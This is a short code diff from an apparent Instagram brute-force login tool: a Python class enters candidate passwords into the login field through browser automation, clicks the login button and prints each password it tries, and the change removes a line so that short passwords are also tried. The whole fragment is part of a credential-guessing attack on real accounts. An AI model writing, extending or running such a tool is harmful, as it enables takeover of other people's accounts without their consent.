@@ -31,7 +31,6 @@ class Instagram:
                     self.passBlock.send_keys(password)
                 else:
                     print("This password is too short!\n", password)
-                    continue
 
                 print("Trying Password; ", password)
                 self.browser.execute_script("arguments[0].click();", self.loginButton)
